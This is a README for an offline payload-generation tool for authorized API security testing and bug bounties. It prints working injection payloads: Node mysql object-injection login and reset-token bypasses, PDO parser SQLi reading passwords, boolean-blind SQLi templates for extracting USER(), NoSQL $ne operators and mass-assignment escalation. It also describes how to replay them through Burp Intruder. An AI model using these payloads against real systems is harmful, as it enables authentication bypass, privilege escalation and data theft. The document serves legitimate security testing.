# ParamStriker

> **Offline JSON & Query Parameter Exploit Framework**
> by **Mohnad Alshobaili**  ·  X: [@Mohnad](https://x.com/Mohnad)

ParamStriker is a offensive, offline payload-generation framework for **authorized API security testing** and bug-bounty research. It produces structured payload corpora targeting JSON serialization quirks, parser-differential bugs, PDO Sql (Node.js `mysql`/`mysql2` object injection), Searchlight Cyber's PHP PDO prepared-statement parser SQLi, char-by-char blind boolean SQLi, NoSQL operator injection, mass-assignment, and 40+ other vulnerability classes.

**It never sends a single network request.** It only writes payload files. Load them into Burp Intruder, ffuf, or your own test harness.

> AUTHORIZED TESTING ONLY. See [SECURITY.md](SECURITY.md).

---

## Features

| Feature | Status |
|---------|--------|
| 13 plugin generators, 100+ subcategories | Done |
| 45 PDO Sql scenarios (login bypass, password reset, 2FA bypass, mass select/update/delete, tenant escape, JWT/session confusion, GraphQL variables, ORM operator-aware variants, prototype-pollution combos) | Done |
| PDO prepared-statement parser SQLi (per-field probe, per-field full-SQLi, canonical col+name pair) | Done |
| Boolean-blind SQLi extractor (INSTR / SUBSTR / MID / REGEXP_SUBSTR rotated through A–Z, a–z, 0–9) | Done |
| Original field value preserved so `WHERE` still matches a real row | Done |
| Parser-differential (comments, trailing commas, unquoted keys, BOM, surrogate pairs) | Done |
| Type confusion (int / string / bool / array / null edge cases, BigInt, NaN, Infinity, negative-zero) | Done |
| Duplicate-key engine (first-wins, last-wins, triple-priv, mixed-type) | Done |
| Encoding (zero-width, BIDI, homoglyph, NFC/NFD/NFKC/NFKD, CRLF, Turkish-i, URL / double-URL) | Done |
| Serialization quirks (Prisma, Sequelize, TypeORM, Mongoose, Jackson, FastJSON, Newtonsoft, orjson) | Done |
| NoSQL operator injection (`$ne`, `$gt`, `$regex`, `$where`, `$expr`, `$elemMatch`, 20 more) | Done |
| Mass assignment (`role`, `is_admin`, `is_superuser`, `verified`, `permissions`, `tenant_id`, 60 more) | Done |
| Smart field analyzer (detects emails, passwords, tokens, IDs, UUIDs, roles, timestamps, prices) | Done |
| Two interactive modes — JSON Body Attack · GET Parameter Attack | Done |
| Multi-format export (JSONL, CSV, TXT, Markdown, Burp, ffuf, Postman) | Done |
| Safety caps (256 KiB / payload, 50-deep nesting, DoS off by default) | Done |
| Zero external dependencies (pure Python 3.8+) | Done |
| Deterministic, deduplicated output | Done |
| Embedded `selftest` (14 checks) | Done |

---

## Contributing

**ParamStriker is open to researchers and developers.** If you have a new attack scenario, a missing parser quirk, a fresh ORM/driver edge case, or any payload family you'd like to see, contributions are very welcome:

- **New scenarios** — open a Pull Request adding a method to the appropriate generator (`PdoSqlGenerator`, `PdoPreparedStatementGenerator`, `BooleanBlindSqliGenerator`, etc.) or write a brand-new `BaseGenerator` subclass and decorate it with `@register`. The plugin architecture means adding a generator is a single self-contained class.
- **New PDO Sql variants** — found a real-world endpoint shape (auth, e-commerce, multi-tenancy, GraphQL, gRPC-over-HTTP, …) where the mysql / mysql2 object-injection primitive applies? Open a PR adding it as a new `_sNN_<name>` method to `PdoSqlGenerator`.
- **New parser-differential bugs** — every released CVE around JSON/SQL parsers is welcome as a regression test.
- **Bug reports / discussion** — open an issue on GitHub.
- **Security disclosures about the tool itself** — see [SECURITY.md](SECURITY.md).

Researchers, bug-bounty hunters, ORM authors, and API-platform engineers — please open issues / PRs. The goal is a community-maintained corpus of every realistic JSON / parameter parser-confusion vector worth testing.

---

## Quick Start

### 1. Install Dependencies

ParamStriker is pure Python — **no `pip install` needed**.

```bash
git clone https://github.com/mmohnad/ParamStriker.git
cd ParamStriker
python --version           # 3.8+ required
```

### 2. Run interactively (default mode)

```bash
python ParamStriker.py
```

You'll see the menu:

```
========================================================================
   Select mode:

    [1]  JSON Body Attack       (all attacks on all body fields)
    [2]  GET Parameter Attack   (all attacks on all query params)
    [q]  Quit
========================================================================
```

Pick `1`, paste your JSON body, and ParamStriker writes a timestamped `.txt` file with one ready-to-test payload per line — load it straight into **Burp Intruder** or **ffuf**.

### 3. Run from the CLI (scripting / CI)

```bash
# JSON body mode
python ParamStriker.py generate --json '{"email":"a@b.c","password":"x"}'

# GET parameter mode
python ParamStriker.py query --query "id=1&token=abc"

# List registered generators (run order)
python ParamStriker.py list

# Embedded self-test (14 checks)
python ParamStriker.py selftest

# All formats at once
python ParamStriker.py generate --json-file body.json \
       --formats jsonl,csv,txt,md,burp,postman --out report
```

---

## Usage & Scenarios

### Scenario A — Authentication endpoint

You're testing `POST /api/login` with body:

```json
{ "email": "alice@x.x", "password": "hunter2" }
```

```bash
python ParamStriker.py
# choose [1], paste the body
```

What lands in `paramstriker_json_<timestamp>.txt`:

```json
// PDO Sql login bypass (Node.js mysql / mysql2)
{"email":{"email":1},"password":{"password":1}}

// Searchlight Cyber PDO col+name pair
{"email":"\\?# ","password":"x` FROM (SELECT password AS `'x` FROM users LIMIT 1)y;#"}

// Boolean-blind SQLi (original value preserved, char-by-char)
{"email":"alice@x.x' AND MID(USER,1,1)='A' --","password":"hunter2"}
{"email":"alice@x.x' AND MID(USER,1,1)='B' --","password":"hunter2"}
... (× 62 chars × 4 templates per field)

// NoSQL operator injection
{"email":"alice@x.x","password":{"$ne":null}}

// Mass-assignment privilege escalation
{"email":"alice@x.x","password":"hunter2","role":"admin","is_admin":true}
```

Drop the file into Burp Intruder · Sniper · payload type **Simple list**, run, watch for response-length deltas.

### Scenario B — Password reset endpoint

`POST /api/reset` with `{ "token": "abc123", "password": "newpw" }`.

ParamStriker emits PDO Sql's exact published attack:

```json
{"token":{"token":1},"password":"newpw"}
```

On any Node `mysql` / `mysql2` stack this becomes `WHERE reset_token = \`token\` = 1` — matching every unexpired reset token row in the DB.

### Scenario C — Mass-update / IDOR

`PATCH /api/users/me` with `{ "user_id": 1, "name": "Alice" }`.

ParamStriker emits combinations including:

```json
{"user_id":{"user_id":1},"name":"Alice","role":"admin","is_admin":true,"permissions":["*"]}
```

Which on vulnerable mass-assignment stacks updates **every row** to admin.

### Scenario D — GET parameter attack (PHP / Express)

```bash
python ParamStriker.py
# choose [2], paste:  id=1&token=abc
```

ParamStriker rewrites each PDO Sql / PDO payload as **PHP-style URL-encoded query notation**:

```
id%5Bid%5D=1&token=abc      # = id[id]=1   (PDO Sql self-ref object)
id=1&token%5B%24ne%5D=      # = token[$ne]= (NoSQL injection)
id=1%27%20AND%20MID%28USER%2C1%2C1%29%3D%27A%27%20--&token=abc
```

PHP and Express automatically parse `?id[id]=1` into `{id: {id: 1}}` on the server — so these GET-format payloads exercise the **exact same** parser-confusion conditions as the JSON-body equivalents.

### Scenario E — Char-by-char `USER()` extraction

For a 3-field JSON body, ParamStriker emits **744 boolean-blind SQLi payloads**:

```
3 fields  ×  4 templates  ×  62 chars (A-Z, a-z, 0-9)  =  744
```

Each preserves the original field value and appends one of:

```sql
' AND INSTR(USER,'<C>')=1 --
' AND REGEXP_SUBSTR(USER, '^.{1}') = '<C>' --
' AND SUBSTR(USER,1,1)='<C>' --
' AND MID(USER,1,1)='<C>' --
```

Replay through Burp Intruder · sort by response length · the row whose response **differs** from the FALSE baseline tells you the first char of `USER()`. Flip the position index (`1,1` → `2,1` → …) to extract the whole string.

---

## Output

Each menu run writes **one file**:

```
paramstriker_json_20260603_143633.txt
paramstriker_query_20260603_143701.txt
```

One ready-to-replay payload per line. For full metadata (category, risk, parser_targets, expected behavior, possible impact, tags), use the CLI:

```bash
python ParamStriker.py generate --json-file body.json \
       --formats jsonl,csv,md
```

---

## Generator Categories

```
PDO Sql              — Node.js mysql/mysql2 object injection (45 scenarios)
PDO_PARSER          — PHP PDO emulated-prepare parser SQLi (per-field + pair)
BOOLEAN_SQLI        — char-by-char blind boolean USER() extraction
TYPE_CONFUSION      — scalar edge cases, raw number literals
DUPLICATE_KEY       — first-wins / last-wins / triple-priv / mixed-type
STRUCTURE           — object↔array, deep nesting, wrapping
PARSER_DIFFERENTIAL — comments, trailing comma, unquoted keys, BOM
ENCODING            — zero-width, BIDI, homoglyph, normalization, CRLF
SERIALIZATION       — Prisma, Sequelize, TypeORM, Mongoose, Jackson, FastJSON
NOSQL               — $ne, $gt, $regex, $where, $expr, 20 more
MASS_ASSIGNMENT     — role, is_admin, scope, tenant_id, 60 more
AUTH_LOGIC          — IDOR probes, filter/pagination bypass
DOS                 — deep nesting, key explosion (off by default, --unsafe)
```

---

## CLI Reference

```
python ParamStriker.py [no args]              → interactive menu
python ParamStriker.py generate <options>     → JSON body mode (scripted)
python ParamStriker.py query    --query QS    → GET parameter mode (scripted)
python ParamStriker.py list                   → list generators
python ParamStriker.py info                   → version + safety info
python ParamStriker.py selftest               → 14-check self-test
```

`generate` options:

```
--json STR             inline JSON body
--json-file PATH       JSON file to read
--out NAME             output basename
--formats LIST         jsonl,csv,txt,burp,ffuf,md,postman
--only CATEGORIES      keep only listed (e.g. PDO Sql,PDO_PARSER)
--disable CATEGORIES   skip listed
--fields LIST          target only named fields
--search REGEX         filter payloads by regex
--limit N              cap total payloads
--seed N               deterministic seed (default 0xA11FD0)
--unsafe               enable DoS payloads
--head N               print first N to stdout
```

---

## References

- **Searchlight Cyber** — Adam Kues, *"A Novel Technique for SQL Injection in PDO's Prepared Statements"*, July 2025
- **PDO Sql InfoSec** — *"MySQL / Node.js Prepared Statement Bypass"*
- **Bishop Fox** — *"An Exploration of JSON Interoperability Vulnerabilities"*

---

## Author

**Mohnad Alshobaili** · X: [@Mohnad](https://x.com/Mohnad)

## License & Use

For **educational and authorized security testing only**. Use against systems you own or have explicit written authorization to test. See [SECURITY.md](SECURITY.md).
